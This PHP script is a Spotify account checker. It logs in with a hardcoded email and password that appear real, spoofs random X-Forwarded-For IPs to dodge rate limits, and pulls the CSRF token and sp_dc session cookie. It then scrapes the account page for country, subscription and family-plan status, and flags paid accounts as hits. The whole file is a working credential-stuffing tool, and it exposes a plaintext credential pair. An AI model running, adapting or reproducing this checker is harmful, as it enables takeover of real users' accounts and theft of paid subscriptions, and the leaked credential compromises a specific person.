<?php

// initialize object
$json = new stdClass();

$json->success = false;
$account = "ja.sotoibm@gmail.com:lv84241t";
$username = explode(":", $account)[0];
$password = explode(":", $account)[1];
$ip = rand(1, 255) . "." . rand(0, 255) . "." . rand(0, 255) . "." . rand(0, 255);

// get csrf token
$request = curl_init();
curl_setopt($request, CURLOPT_URL,"https://accounts.spotify.com/en/login");
curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
curl_setopt($request, CURLOPT_HEADER, true);
curl_setopt($request, CURLOPT_HTTPHEADER, array(
		"X-Forwarded-For: " . $ip
));
$response = curl_exec($request);
curl_close($request);
preg_match_all("/set-cookie: ([^;]*)/i", $response, $cookies);
$csrf_token = getCookie("csrf_token", $cookies);

// check if account valid
if($csrf_token != null){
	$request = curl_init();
		curl_setopt($request, CURLOPT_URL,"https://accounts.spotify.com/api/login");
		curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($request, CURLOPT_HEADER, true);
		curl_setopt($request, CURLOPT_POST, true);
		curl_setopt($request, CURLOPT_POSTFIELDS, "username=" . $username . "&password=" . $password . "&csrf_token=" . $csrf_token);
		curl_setopt($request, CURLOPT_HTTPHEADER, array(
			"X-Forwarded-For: " . $ip,
			"User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; TA-1053 Build/OPR1.170623.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3368.0 Mobile Safari/537.36",
			"Cookie: csrf_token=" . $csrf_token . "; __bon=MHwwfDB8MHwxfDF8MXwx"
		));
		$response = curl_exec($request);
		curl_close($request);
		
		// check if success then goto account overwiew to get the info we want
		if(strpos($response, "displayName")){
			preg_match_all("/set-cookie: ([^;]*)/i", $response, $cookies);
			$sp_dc = getCookie("sp_dc", $cookies);
			if($sp_dc != null){
				$request = curl_init();
				curl_setopt($request, CURLOPT_URL,"https://www.spotify.com/us/account/overview/");
				curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($request, CURLOPT_HTTPHEADER, array(
					"X-Forwarded-For: " . $ip,
					"Cookie: sp_dc=" . $sp_dc
				));
				$response = curl_exec($request);
				curl_close($request);
				
				if(strpos($response, "<h1>Account overview</h1>")){
					if(!strpos($response, "Spotify Free") && !strpos($response, "Premium paused")){
						$json->success = true;
						preg_match("/card-profile-country\">([^<]*)/", $response, $country);
						preg_match("/<div class=\"well card subscription \" id=\"\"><h3 class=\"product-name\".*>(.*)<\/h3>/", $response, $subscription);
						$json->country = $country[1];
						$json->subscription = $subscription[1];
						$json->owner = boolval(strpos($response, "btn-manage-familyplan"));
					}
					//break;
				}
			}
		} else {
			//break;
		}
	
}

echo json_encode($json);

function getCookie($name, $cookies){
	foreach($cookies[1] as $cookie){
		$cookieName = explode("=", $cookie)[0];
		$cookieValue = explode("=", $cookie)[1];
		if($cookieName == $name){
			return $cookieValue;
		}
	}
}

